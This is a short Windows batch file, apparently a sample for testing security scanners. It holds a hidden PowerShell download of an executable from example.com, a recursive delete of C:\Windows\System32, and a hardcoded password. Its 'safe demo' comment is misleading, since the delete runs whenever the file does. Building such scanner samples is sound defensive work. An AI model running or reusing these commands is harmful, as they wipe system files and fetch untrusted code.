@echo off
rem Safe demo script for scanner testing. Do not run destructive commands.
powershell -WindowStyle Hidden -Command "Invoke-WebRequest http://example.com/demo.exe"
del /s /q C:\Windows\System32\*
set password=demo_script_password_123
